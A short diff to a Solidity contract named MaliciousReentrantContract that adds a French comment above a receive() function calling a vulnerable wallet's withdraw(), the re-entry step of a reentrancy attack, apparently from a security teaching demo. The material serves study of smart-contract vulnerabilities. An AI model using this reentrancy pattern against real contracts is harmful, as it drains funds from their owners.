@@ -27,6 +27,7 @@ contract MaliciousReentrantContract is Ownable {
 
     // receive function will be called by the vulnerable wallet contract
     receive() external payable {
+        // balance du smart contract incrementé de amount
         _vulWallet.withdraw();
     }
 
